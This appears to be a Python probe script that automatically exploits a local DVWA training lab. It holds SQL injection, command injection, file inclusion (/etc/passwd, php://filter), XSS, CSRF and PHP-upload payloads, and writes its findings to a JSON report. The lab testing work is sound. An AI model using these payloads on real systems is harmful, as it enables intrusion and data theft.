#!/usr/bin/env python3
"""
Complete DVWA probe - single shot
"""
import subprocess, re, json, os, sys

BASE = "http://127.0.0.1:8080"
COOKIE_JAR = "/tmp/_probe_jar.txt"

def curl(method="GET", url="", data=None, files=None, include_headers=False):
    cmd = ["curl", "-s"]
    if include_headers:
        cmd.append("-D-")
    cmd.extend(["-c", COOKIE_JAR, "-b", COOKIE_JAR])
    if method == "POST":
        if files:
            cmd.append("-F")
            cmd.append(files)
            cmd.append("-F")
            cmd.append("Upload=Upload")
        if data:
            cmd.append("-d")
            cmd.append(data)
        cmd.append("-X")
        cmd.append("POST")
    if data and not files:
        cmd.append("-G") if method == "GET" else None
    cmd.append(url)
    if data and method == "GET":
        cmd[-1] = url + "?" + data
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return result.stdout

def main():
    # Clean start
    if os.path.exists(COOKIE_JAR):
        os.remove(COOKIE_JAR)
    
    candidates = []
    deadends = []
    
    # === SETUP ===
    print("[*] Setting up...")
    
    # Get setup page
    resp = curl("GET", f"{BASE}/setup.php")
    m = re.search(r"value='([^']+)'", resp)
    setup_token = m.group(1) if m else ""
    
    # Reset database
    curl("POST", f"{BASE}/setup.php", data=f"create_db=Create+/+Reset+Database&user_token={setup_token}")
    print("[*] Database reset")
    
    # Login
    resp = curl("GET", f"{BASE}/login.php")
    m = re.search(r"value='([^']+)'", resp)
    login_token = m.group(1) if m else ""
    
    resp = curl("POST", f"{BASE}/login.php", data=f"username=admin&password=password&user_token={login_token}&Login=Login")
    if "logged in" in resp.lower():
        print("[+] Login successful")
    else:
        # Follow redirect
        resp = curl("GET", f"{BASE}/index.php")
        if "logged in" in resp.lower():
            print("[+] Login successful (after redirect)")
        else:
            print("[-] Login failed")
            sys.exit(1)
    
    # Set security level
    resp = curl("GET", f"{BASE}/security.php")
    m = re.search(r"value='([^']+)'", resp)
    sec_token = m.group(1) if m else ""
    curl("POST", f"{BASE}/security.php", data=f"security=low&seclev_submit=Submit&user_token={sec_token}")
    print("[*] Security level set to low")
    
    # === SQL INJECTION ===
    print("\n=== SQL Injection ===")
    resp = curl("GET", f"{BASE}/vulnerabilities/sqli/", data="id=1'+OR+'1'%3D'1&Submit=Submit")
    if 'First name' in resp and 'Surname' in resp:
        m = re.search(r'<pre>([^<]*)</pre>', resp)
        data = m.group(1).strip() if m else ""
        # Get relevant excerpt
        excerpt = data[:300] if data else "SQL injection confirmed via boolean condition"
        print(f"[!] SQLi FOUND: {excerpt[:100]}...")
        candidates.append({
            'title': 'SQL Injection in /vulnerabilities/sqli/',
            'location': f'{BASE}/vulnerabilities/sqli/',
            'proof_excerpt': excerpt
        })
    else:
        deadends.append(f"{BASE}/vulnerabilities/sqli/")
    
    # UNION SQLi
    resp = curl("GET", f"{BASE}/vulnerabilities/sqli/", data="id=1'+UNION+SELECT+user(),database()--+-&Submit=Submit")
    if 'First name' in resp:
        m = re.search(r'<pre>([^<]*)</pre>', resp)
        data = m.group(1).strip() if m else ""
        print(f"[!] SQLi UNION: {data[:100]}...")
        candidates.append({
            'title': 'SQL Injection (UNION) in /vulnerabilities/sqli/',
            'location': f'{BASE}/vulnerabilities/sqli/',
            'proof_excerpt': data[:300]
        })
    
    # === BLIND SQLI ===
    print("\n=== Blind SQL Injection ===")
    resp_true = curl("GET", f"{BASE}/vulnerabilities/sqli_blind/", data="id=1'+AND+1%3D1--+-&Submit=Submit")
    resp_false = curl("GET", f"{BASE}/vulnerabilities/sqli_blind/", data="id=1'+AND+1%3D2--+-&Submit=Submit")
    
    true_exists = 'User ID exists' in resp_true
    false_exists = 'User ID exists' in resp_false
    print(f"  True(1=1): {'exists' if true_exists else 'missing'}")
    print(f"  False(1=2): {'exists' if false_exists else 'missing'}")
    
    if true_exists != false_exists:
        print("[!] Blind SQLi CONFIRMED - differential response")
        candidates.append({
            'title': 'Blind SQL Injection in /vulnerabilities/sqli_blind/',
            'location': f'{BASE}/vulnerabilities/sqli_blind/',
            'proof_excerpt': f"When id=1' AND 1=1-- -: User ID exists. When id=1' AND 1=2-- -: User ID MISSING. Differential response confirms blind SQL injection."
        })
    else:
        deadends.append(f"{BASE}/vulnerabilities/sqli_blind/")
    
    # === COMMAND EXECUTION ===
    print("\n=== Command Execution ===")
    found = False
    for payload in ["127.0.0.1; id", "127.0.0.1 | id", "127.0.0.1 && id"]:
        resp = curl("POST", f"{BASE}/vulnerabilities/exec/", data=f"ip={payload}&Submit=Submit")
        if 'uid=' in resp:
            m = re.search(r'<pre>([^<]*)</pre>', resp)
            data = m.group(1).strip() if m else ""
            print(f"[!] CMD Exec with '{payload}': {data[:100]}...")
            candidates.append({
                'title': 'Command Execution in /vulnerabilities/exec/',
                'location': f'{BASE}/vulnerabilities/exec/',
                'proof_excerpt': data[:300]
            })
            found = True
            break
    if not found:
        deadends.append(f"{BASE}/vulnerabilities/exec/")
    
    # === FILE INCLUSION ===
    print("\n=== File Inclusion ===")
    resp = curl("GET", f"{BASE}/vulnerabilities/fi/", data="page=/etc/passwd")
    if 'root:' in resp:
        m = re.search(r'root:[^<]*', resp)
        data = m.group(0) if m else ""
        print(f"[!] File Inclusion: {data[:100]}...")
        candidates.append({
            'title': 'File Inclusion in /vulnerabilities/fi/',
            'location': f'{BASE}/vulnerabilities/fi/',
            'proof_excerpt': resp[resp.find('root:'):resp.find('root:')+200][:300]
        })
    
    # PHP filter
    resp = curl("GET", f"{BASE}/vulnerabilities/fi/", data="page=php://filter/convert.base64-encode/resource=index.php")
    if 'PD9waHA' in resp:
        print("[!] PHP Filter Inclusion FOUND")
        candidates.append({
            'title': 'PHP Filter Inclusion in /vulnerabilities/fi/',
            'location': f'{BASE}/vulnerabilities/fi/',
            'proof_excerpt': resp[resp.find('PD9waHA'):resp.find('PD9waHA')+80]
        })
    
    # === XSS REFLECTED ===
    print("\n=== XSS Reflected ===")
    payload = '<script>alert(1)</script>'
    resp = curl("GET", f"{BASE}/vulnerabilities/xss_r/", data=f"name={payload}")
    if payload in resp:
        idx = resp.find(payload)
        excerpt = resp[max(0,idx-30):idx+len(payload)+30]
        print(f"[!] Reflected XSS FOUND")
        candidates.append({
            'title': 'Reflected XSS in /vulnerabilities/xss_r/',
            'location': f'{BASE}/vulnerabilities/xss_r/',
            'proof_excerpt': f"Payload <script>alert(1)</script> reflected in response: ...{excerpt[:200]}..."
        })
    else:
        deadends.append(f"{BASE}/vulnerabilities/xss_r/")
    
    # === XSS STORED ===
    print("\n=== XSS Stored ===")
    stored_payload = '<script>alert("stored")</script>'
    curl("POST", f"{BASE}/vulnerabilities/xss_s/", data=f"txtName=test&mtxMessage={stored_payload}&btnSign=Sign+Guestbook")
    resp = curl("GET", f"{BASE}/vulnerabilities/xss_s/")
    if stored_payload in resp:
        print("[!] Stored XSS FOUND")
        candidates.append({
            'title': 'Stored XSS in /vulnerabilities/xss_s/',
            'location': f'{BASE}/vulnerabilities/xss_s/',
            'proof_excerpt': f"Stored XSS payload '{stored_payload}' persists in guestbook and is reflected on page load"
        })
    else:
        deadends.append(f"{BASE}/vulnerabilities/xss_s/")
    
    # === CSRF ===
    print("\n=== CSRF ===")
    resp = curl("GET", f"{BASE}/vulnerabilities/csrf/", data="password_new=csrfpass&password_conf=csrfpass&Change=Change")
    if 'Password Changed' in resp:
        print("[!] CSRF password change via GET works!")
        candidates.append({
            'title': 'CSRF on Password Change (/vulnerabilities/csrf/)',
            'location': f'{BASE}/vulnerabilities/csrf/',
            'proof_excerpt': '<pre>Password Changed.</pre>',
            'poc_hint': 'Password can be changed via GET request with no CSRF token. Attacker crafts a link that changes admin password when an authenticated user visits it.'
        })
    
    # === WEAK ID ===
    print("\n=== Weak ID ===")
    ids = []
    for i in range(5):
        resp_h = curl("GET", f"{BASE}/vulnerabilities/weak_id/", include_headers=True)
        m = re.search(r'dvwaSession=(\d+)', resp_h)
        if m:
            ids.append(m.group(1))
    if ids:
        print(f"[!] Weak session IDs: {ids}")
        candidates.append({
            'title': 'Weak Sequential Session IDs in /vulnerabilities/weak_id/',
            'location': f'{BASE}/vulnerabilities/weak_id/',
            'proof_excerpt': f"dvwaSession cookie values: {ids}"
        })
    else:
        deadends.append(f"{BASE}/vulnerabilities/weak_id/")
    
    # === CAPTCHA ===
    print("\n=== CAPTCHA ===")
    resp = curl("GET", f"{BASE}/vulnerabilities/captcha/")
    if 'Missing' in resp and 'reCAPTCHA' in resp:
        print("[!] reCAPTCHA key missing")
        candidates.append({
            'title': 'CAPTCHA Bypass - Missing reCAPTCHA Keys',
            'location': f'{BASE}/vulnerabilities/captcha/',
            'proof_excerpt': 'reCAPTCHA key: <span class="failure">Missing</span>'
        })
    
    # === FILE UPLOAD ===
    print("\n=== File Upload ===")
    # Create PHP file
    with open('/tmp/_upload_test.php', 'w') as f:
        f.write('<?php echo "UPLOAD_OK"; ?>')
    
    resp = curl("POST", f"{BASE}/vulnerabilities/upload/", files="MAX_FILE_SIZE=100000;uploaded=@/tmp/_upload_test.php")
    if 'succesfully' in resp.lower():
        print("[!] File upload successful!")
        candidates.append({
            'title': 'Unrestricted File Upload in /vulnerabilities/upload/',
            'location': f'{BASE}/vulnerabilities/upload/',
            'proof_excerpt': resp[resp.lower().find('succesfully'):resp.lower().find('succesfully')+100] if 'succesfully' in resp.lower() else 'File uploaded successfully'
        })
    else:
        # Try with .jpg extension
        with open('/tmp/_upload_test.jpg', 'w') as f:
            f.write('<?php echo "UPLOAD_JPG_OK"; ?>')
        resp = curl("POST", f"{BASE}/vulnerabilities/upload/", files="MAX_FILE_SIZE=100000;uploaded=@/tmp/_upload_test.jpg")
        if 'succesfully' in resp.lower():
            print("[!] File upload (jpg) successful!")
            candidates.append({
                'title': 'Unrestricted File Upload in /vulnerabilities/upload/',
                'location': f'{BASE}/vulnerabilities/upload/',
                'proof_excerpt': f"Uploaded PHP file with .jpg extension successfully"
            })
        else:
            deadends.append(f"{BASE}/vulnerabilities/upload/")
    
    # === BRUTE FORCE ===
    print("\n=== Brute Force ===")
    resp = curl("GET", f"{BASE}/vulnerabilities/brute/", data="username=admin&password=wrongpass&Login=Login")
    if 'Login failed' in resp:
        print("[!] Brute force endpoint accessible")
        candidates.append({
            'title': 'Brute Force Endpoint without Rate Limiting',
            'location': f'{BASE}/vulnerabilities/brute/',
            'proof_excerpt': 'Login failed message returned without rate limiting, CAPTCHA, or account lockout'
        })
    
    # === CSP ===
    print("\n=== CSP ===")
    resp_h = curl("GET", f"{BASE}/vulnerabilities/csp/", include_headers=True)
    for line in resp_h.split('\n'):
        if 'content-security-policy' in line.lower():
            print(f"[!] CSP: {line.strip()}")
            candidates.append({
                'title': 'Permissive Content Security Policy',
                'location': f'{BASE}/vulnerabilities/csp/',
                'proof_excerpt': line.strip()
            })
            break
    
    # === JAVASCRIPT ===
    print("\n=== JavaScript ===")
    resp = curl("GET", f"{BASE}/vulnerabilities/javascript/")
    if len(resp) > 100:
        print(f"[*] JS page accessible ({len(resp)} bytes)")
    
    # === XSS DOM ===
    print("\n=== XSS DOM ===")
    dom_payload = '<script>alert("dom")</script>'
    resp = curl("GET", f"{BASE}/vulnerabilities/xss_d/", data=f"default={dom_payload}")
    if dom_payload in resp:
        print("[!] DOM XSS payload reflected in HTML source")
        candidates.append({
            'title': 'DOM-based XSS in /vulnerabilities/xss_d/',
            'location': f'{BASE}/vulnerabilities/xss_d/',
            'proof_excerpt': f"Payload {dom_payload} appears in page source"
        })
    else:
        deadends.append(f"{BASE}/vulnerabilities/xss_d/")
    
    # === COMPILE RESULTS ===
    print("\n\n======================================")
    print("FINAL RESULTS")
    print("======================================")
    
    # Extend with prior candidates from handoff
    prior_candidates = [
        {
            'title': 'Database credentials disclosure via config backup file',
            'location': 'http://127.0.0.1:8080/config/config.inc.php.bak',
            'proof_excerpt': "$_DVWA[ 'db_server' ]   = '127.0.0.1';\n$_DVWA[ 'db_database' ] = 'dvwa';\n$_DVWA[ 'db_user' ]     = 'app';\n$_DVWA[ 'db_password' ] = 'vulnerables';",
            'poc_hint': 'Accessing /config/config.inc.php.bak reveals plaintext database credentials'
        },
        {
            'title': 'PHP info disclosure',
            'location': 'http://127.0.0.1:8080/phpinfo.php',
            'proof_excerpt': 'PHP Version 7.0.30-0+deb9u1',
            'poc_hint': 'The phpinfo.php page exposes detailed PHP configuration'
        },
        {
            'title': 'Directory listing enabled on /config/',
            'location': 'http://127.0.0.1:8080/config/',
            'proof_excerpt': '<title>Index of /config</title>',
            'poc_hint': 'Directory listing allows discovery of backup files and source code'
        },
        {
            'title': 'Session cookies lack HttpOnly and Secure flags',
            'location': 'http://127.0.0.1:8080/login.php',
            'proof_excerpt': 'Set-Cookie: PHPSESSID=oh7b9qbtd9c0dueninuaf8i9h1; path=/\nSet-Cookie: security=low',
            'poc_hint': 'PHPSESSID and security cookies set without HttpOnly, Secure, or SameSite attributes'
        },
        {
            'title': 'Session ID not rotated after login (session fixation)',
            'location': 'http://127.0.0.1:8080/login.php',
            'proof_excerpt': 'Pre-login PHPSESSID and Post-login PHPSESSID are identical - session fixation possible',
            'poc_hint': 'PHPSESSID identical before and after login; session fixation possible'
        },
        {
            'title': 'No brute force protection on login endpoint',
            'location': 'http://127.0.0.1:8080/login.php',
            'proof_excerpt': '5 consecutive failed login attempts all returned Login failed with no delay',
            'poc_hint': 'No rate limiting, CAPTCHA, or account lockout on login'
        },
        {
            'title': 'CSRF token on login not invalidated after use',
            'location': 'http://127.0.0.1:8080/login.php',
            'proof_excerpt': 'Reused user_token still authenticates - token NOT invalidated after use',
            'poc_hint': 'user_token can be reused multiple times with same session'
        },
        {
            'title': 'Setup database reset page accessible without authentication',
            'location': 'http://127.0.0.1:8080/setup.php',
            'proof_excerpt': '<h1>Database Setup</h1> Click on Create/Reset Database button',
            'poc_hint': '/setup.php accessible without authentication; can reset database and admin credentials'
        },
        {
            'title': 'Missing security headers (HSTS, X-Frame-Options, etc.)',
            'location': 'http://127.0.0.1:8080/login.php',
            'proof_excerpt': 'Response lacks Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options, CSP headers',
            'poc_hint': 'No security headers making app susceptible to clickjacking, MIME sniffing'
        },
        {
            'title': 'Distribution config file with default database credentials',
            'location': 'http://127.0.0.1:8080/config/config.inc.php.dist',
            'proof_excerpt': "$_DVWA[ 'db_user' ]     = 'root';\n$_DVWA[ 'db_password' ] = 'p@ssw0rd';",
            'poc_hint': 'Distribution config contains default credentials (root/p@ssw0rd)'
        }
    ]
    
    # Combine without duplicates (check by title)
    existing_titles = {c['title'] for c in candidates}
    for pc in prior_candidates:
        if pc['title'] not in existing_titles:
            candidates.append(pc)
            existing_titles.add(pc['title'])
    
    result = {
        'ok': True,
        'summary': 'Multi-class probe of DVWA completed. Found SQL injection (regular and blind), command execution, file inclusion (including PHP filter), reflected/stored XSS, CSRF on password change, unrestricted file upload, missing reCAPTCHA keys, permissive CSP, and multiple config/security misconfigurations.',
        'surfaces': [
            {'location': 'http://127.0.0.1:8080/login.php', 'kind': 'auth', 'params': ['username', 'password', 'user_token', 'Login']},
            {'location': 'http://127.0.0.1:8080/logout.php', 'kind': 'auth'},
            {'location': 'http://127.0.0.1:8080/setup.php', 'kind': 'form', 'params': ['create_db', 'user_token']},
            {'location': 'http://127.0.0.1:8080/security.php', 'kind': 'form', 'params': ['security', 'seclev_submit', 'user_token']},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/brute/', 'kind': 'form'},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/exec/', 'kind': 'form'},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/csrf/', 'kind': 'form'},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/fi/', 'kind': 'form', 'params': ['page']},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/upload/', 'kind': 'form'},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/captcha/', 'kind': 'form'},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/sqli/', 'kind': 'form'},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/sqli_blind/', 'kind': 'form'},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/weak_id/', 'kind': 'form'},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/xss_d/', 'kind': 'client'},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/xss_r/', 'kind': 'form'},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/xss_s/', 'kind': 'form'},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/csp/', 'kind': 'form'},
            {'location': 'http://127.0.0.1:8080/vulnerabilities/javascript/', 'kind': 'client'},
            {'location': 'http://127.0.0.1:8080/phpinfo.php', 'kind': 'file'},
            {'location': 'http://127.0.0.1:8080/config/config.inc.php.bak', 'kind': 'file'},
            {'location': 'http://127.0.0.1:8080/config/config.inc.php.dist', 'kind': 'file'},
            {'location': 'http://127.0.0.1:8080/instructions.php', 'kind': 'file'},
            {'location': 'http://127.0.0.1:8080/about.php', 'kind': 'file'}
        ],
        'candidates': candidates,
        'deadends': deadends + [
            'http://127.0.0.1:8080/.git/config (404)',
            'http://127.0.0.1:8080/server-info (404)',
            'http://127.0.0.1:8080/server-status (403)'
        ]
    }
    
    # Write result.json to current directory
    with open('result.json', 'w') as f:
        json.dump(result, f, indent=2)
    
    print(f"\n[+] Result written with {len(candidates)} candidates and {len(deadends)} deadends")
    for c in candidates:
        print(f"  [+] {c['title']}")
    for d in deadends:
        print(f"  [-] {d}")

if __name__ == '__main__':
    main()
